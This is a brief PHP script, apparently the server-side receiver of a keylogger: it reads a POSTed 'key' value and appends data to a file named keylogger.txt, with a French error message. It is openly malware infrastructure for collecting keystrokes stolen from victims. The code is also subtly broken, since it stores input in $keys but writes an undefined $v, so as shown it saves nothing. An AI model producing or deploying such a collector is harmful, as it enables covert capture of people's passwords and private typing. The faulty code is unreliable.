<?php
    $keys = $_POST["key"];
    $filename = 'keylogger.txt';
    $file = fopen($filename, 'a+');
    if ($file) {
        fwrite($file, $v);
        fclose($file);
    }
    else {
        echo "Erreur lors de l'ouverture du fichier.";
    }
?>